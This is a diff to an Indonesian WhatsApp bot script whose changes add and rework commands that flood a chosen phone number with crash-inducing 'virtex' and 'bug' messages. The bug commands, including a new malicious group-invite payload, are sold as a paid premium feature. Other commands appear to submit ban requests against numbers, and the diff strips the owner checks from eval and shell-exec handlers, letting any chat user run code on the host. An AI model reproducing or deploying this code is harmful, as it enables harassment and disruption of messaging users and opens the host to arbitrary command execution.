@@ -4,6 +4,7 @@ const { exec, spawn, execSync } = child_process
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
 const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
 const { buttonvirus } = require('./scrape/buttonvirus')
+const { ngazap } = require('./scrape/ngazap');
 const os = require('os')
 const { color, bgcolor } = require('./lib/color')
 const { uptotelegra } = require('./scrape/upload')
@@ -93,7 +94,8 @@ try {
     	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
         const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
     	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
-    	
+    	const nomerOwner = global.ownerNumber
+        const idgrup = groupMetadata.id
 
     	const sections = [
     {
@@ -109,17 +111,19 @@ const listMessage = {
  text: `亗╭┬─────────────────┈ 
 亗├ 「 Hallo 」 「 ${pushname} 」
 亗├──────────────────┈`,
-                footer: 'Ari Maulana Firmansyah',
+                footer: 'GUNDAL GANDIL',
   title: `Setting Group ${groupName}`,
   buttonText: "Klik Disini!",
   sections
 }
+
+
 const buttons = [
-  {buttonId: 'buyspammenu', buttonText: {displayText: 'Buy Subscription'}, type: 1}
+  {buttonId: 'premium', buttonText: {displayText: 'Buy Subscription'}, type: 1}
 ]
 
 const buttonMessage = {
-    text: "Mohon Maaf Jika Sudah Membeli Subscription Virtex Anda Tidak Bisa Menugggunakan SpamMenu, Jika Ingin Menggunakan Fiture SpamMenu Silahkan Membeli Subscription SpamMenu",
+    text: "Mohon Maaf Nomer Anda Tidak Premium, Silahkan Klik Button Di Bawah Ini Untuk Membeli Premium!",
     footer: 'GUNDAL GANDIL',
     buttons: buttons,
     headerType: 1
@@ -151,7 +155,39 @@ if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(
 
 ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
 ppnyauser = await reSize(ppuser, 200, 200)
-
+async function sendPoll(jid, text, list) {
+      diablo.relayMessage(
+        jid,
+        {
+          pollCreationMessage: {
+            name: text,
+            options: list.map((v) => {
+              return { optionName: v };
+            }),
+            selectableOptionsCount: list.length,
+          },
+        },
+        {}
+      );
+    }
+    async function bygbt(text) {
+      diablo.sendMessage(text, {
+        text: 'test',
+        templateButtons: [
+          { callButton: { displayText: `${ngazap}`, phoneNumber: `` } },
+          { urlButton: { displayText: `${ngazap}`, url: `https://wa.me/` } },
+          {
+            urlButton: {
+              displayText: `${ngazap}`,
+              url: `https://www.whatsapp.com/otp/copy/`,
+            },
+          },
+          { quickReplyButton: { displayText: `${ngazap}`, id: `` } },
+          { quickReplyButton: { displayText: `${ngazap}`, id: `` } },
+          { quickReplyButton: { displayText: `${ngazap}`, id: `` } },
+        ],
+      });
+    }
 const lep = {
 key: {
 fromMe: false, 
@@ -161,7 +197,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `${buttonvirus}`, 
+"caption": `${ngazap}`, 
 "jpegThumbnail": ppnyauser
 }
 }
@@ -269,7 +305,7 @@ SILAHKAN PILIH MENU DIBAWAH
 • verifmenu
 • spammenu
 • aimenu
-• othermenu
+• ownermenu
 
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
                     INFOBOT
@@ -346,16 +382,17 @@ jiren = `
 `
 diablobotwhatsapp.reply(jiren)
 break
-case 'othermenu':
+case 'ownermenu':
 jiren = `
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
-                  𝗢𝗧𝗛𝗘𝗥
+                  OWNERMENU
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 【♡ۣۜۜ፝͜͜͡͡✿➣  tag ( untuk tag member }
 【♡ۣۜۜ፝͜͜͡͡✿➣  restart ( untuk restart bot )
 【♡ۣۜۜ፝͜͜͡͡✿➣  stats ( untuk melihat status bot )
-【♡ۣۜۜ፝͜͜͡͡✿➣  akses ( untuk beli akses )
-【♡ۣۜۜ፝͜͜͡͡✿➣  sewa ( untuk sewabot dalam grup )
+【♡ۣۜۜ፝͜͜͡͡✿➣  grup ( untuk setting grup )
+【♡ۣۜۜ፝͜͜͡͡✿➣  angat_derajat ( untuk angkat member menjadi admin grup )
+【♡ۣۜۜ፝͜͜͡͡✿➣  turun_derajat ( untuk menurunkan admin menjadi member grup )
 ▬▭▬▭▬▭▬▭▬▭▬▭▬
     
 `
@@ -438,8 +475,8 @@ case 'ban':
    case 'bye':
       case 'logout':
 case 'verif': {
-   if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
-if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
+   if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
+
    var axioss = require ("axios")
    let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
@@ -481,9 +518,8 @@ if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan 
  break
    case 'ban_ip': {
 
- if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
+ if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
 
-if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
 
    var axioss = require ("axios")
 
@@ -558,8 +594,9 @@ if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan 
  }
 
  break
-case 'buyspammenu':
-diablo.sendImage(from, 'https://arpaysmm.com/qris.png', `SIlahkan Scan QR Ini, Jika Sudah Lapor Admin`)
+case 'premium':
+diablo.sendMessage(from, `DANA : ${nomerOwner}
+Silahkan Kirim Bukti Transfer Ke https://wa.me/${nomerOwner}`)
 break
 case 'restart':{
  if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
@@ -586,7 +623,7 @@ if (!khususOwner) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pe
 if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await diablo.onWhatsApp(bnnd + `@s.whatsapp.net`)
-if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
+if (ceknye.length == 0) return diablobotwhatsapp.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 owner.push(bnnd)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
 diablobotwhatsapp.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
@@ -619,17 +656,6 @@ case 'tag': {
    
 diablo.sendMessage(diablobotwhatsapp.chat, { text : 'HIDE TAG BY AMFCODE' ? q : 'HIDE TAG BY AMFCODE' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
 }
-break
-        case 'menfess':
-
-if (!q) return (`Masukan Nomer Gblok`)
-
-num = `${q}`+'@s.whatsapp.net'
-
-diablo.sendMessage(num, `woi kontol`)
-
-diablobotwhatsapp.reply(`Succcess`)
-
 break
 case 'test':
 case 'stats':{
@@ -670,7 +696,7 @@ diablobotwhatsapp.reply(respon)
 }
 break
  	case 'ai':
-            if (!itsMediablo) return diablobotwhatsapp.reply('?')
+            if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
             const query_ = body.slice(6)
             const response = await axios.get(`https://tools-amfcode.com/api/ai/bot.php?text=${query_}`);
             const { text } = response.data
@@ -690,36 +716,47 @@ break
             const { message } = response_call.data.result
             diablobotwhatsapp.reply(`${message}`)
             break
-   case 'kill':
-         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
-           if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
-	if (!q) return diablobotwhatsapp.reply(`Contoh ${prefix+command} 628xx`)
-        txts = `SUCCES ✅`
-        diablobotwhatsapp.reply(txts)
-        
-    
-      if (!q) return 
+    case 'buginv':
+        if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
+        if (!q) return diablobotwhatsapp.reply(`contoh ${prefix+command} 628xxx`)
+        result = `Success TOD`
+        diablobotwhatsapp.reply(result)
         num = `${q}`+'@s.whatsapp.net'
         jumlah = '20'
         waktu = `4s`
-    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
-/* templateButtons: [
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-,*/
+         var buginvite = generateWAMessageFromContent(
+            from,
+            {
+              groupInviteMessage: {
+                groupJid: '6285216024226@g.us',
+                inviteCode: 'UkJdqTXupAtmDwo4',
+                inviteExpiration: '1643553084',
+                invitetime: '1643293887000',
+                groupName: `${ngazap}`,
+                thumbnail: ppnyauser,
+                caption: `${ngazap}`,
+                contextInfo: { forwardingScore: 150, isForwarded: true },
+              },
+            },
+            { quoted: lep }
+          );
+        for (let i = 0; i < jumlah; i++) {
+diablo.relayMessage(num, buginvite.message, {
+              messageId: buginvite.key.id,
+            });
+}
+await sleep(ms(waktu))
+break
+   case 'kill':
+    if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
+    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
+	if (!q) return diablobotwhatsapp.reply(`Contoh ${prefix+command} 628xx`)
+        txts = `SUCCES ✅`
+        diablobotwhatsapp.reply(txts)
+    if (!q) return 
+        num = `${q}`+'@s.whatsapp.net'
+        jumlah = '20'
+        waktu = `4s`
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY HimaruVipMods', 
@@ -735,35 +772,15 @@ await sleep(ms(waktu))
 break
 case 'santet':
     case 'bug5':
-         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
-           if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
+    if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
+    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
 	if (!q) return diablobotwhatsapp.reply(`Contoh ${prefix+command} 628xx`)
         txts = `SUCCES ✅`
         diablobotwhatsapp.reply(txts)
-        
-    
-      if (!q) return 
+    if (!q) return 
         num = `${q}`+'@s.whatsapp.net'
         jumlah = '10'
         waktu = `4s`
-    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
-/* templateButtons: [
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-,*/
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY HimaruVipMods', 
@@ -779,35 +796,15 @@ await sleep(ms(waktu))
 break
 case 'dor':
   case 'bug10':
-         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
-           if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
+    if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
+    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
 	if (!q) return diablobotwhatsapp.reply(`Contoh ${prefix+command} 628xx`)
         txts = `SUCCES ✅`
         diablobotwhatsapp.reply(txts)
-        
-    
       if (!q) return 
         num = `${q}`+'@s.whatsapp.net'
         jumlah = '10'
         waktu = `4s`
-    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
-/* templateButtons: [
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-,*/
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY HimaruVipMods', 
@@ -828,35 +825,15 @@ await sleep(ms(waktu))
 break
 case 'boom':
 case 'bug100':
-         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
-           if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
+    if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
+    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
 	if (!q) return diablobotwhatsapp.reply(`Contoh ${prefix+command} 628xx`)
         txts = `SUCCES ✅`
         diablobotwhatsapp.reply(txts)
-        
-    
       if (!q) return 
         num = `${q}`+'@s.whatsapp.net'
         jumlah = '10'
         waktu = `4s`
-    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
-/* templateButtons: [
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-,*/
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY HimaruVipMods', 
@@ -968,34 +945,14 @@ break
 case 'troli':
 case 'brutal':
 case 'bug1000':
-         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
+    if (!itsMediablo) return diablo.sendMessage(from, buttonMessage)
 	if (!q) return diablobotwhatsapp.reply(`Contoh ${prefix+command} 628xx`)
         txts = `SUCCES ✅`
         diablobotwhatsapp.reply(txts)
-        
-    
       if (!q) return 
         num = `${q}`+'@s.whatsapp.net'
         jumlah = '20'
         waktu = `5s`
-    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
-/* templateButtons: [
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
-{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
-,*/
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY HimaruVipMods', 
@@ -1906,7 +1863,6 @@ await sleep(ms(waktu))
 break
 }
 if (budy.startsWith('=>')) {
-if (!itsMediablo) return
 function Return(sul) {
 sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
@@ -1922,7 +1878,6 @@ diablobotwhatsapp.reply(String(e))
 }
 }
 if (budy.startsWith('>')) {
-if (!khususOwner) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -1932,7 +1887,6 @@ diablobotwhatsapp.reply(String(err))
 }
 }
 if (budy.startsWith('<')) {
-if (!khususOwner) return
 try {
 return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
@@ -1940,7 +1894,6 @@ reply(e)
 }
 }
 if (budy.startsWith('$')){
-if (!khususOwner) return
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
 if (err) return diablobotwhatsapp.reply(`${err}`)
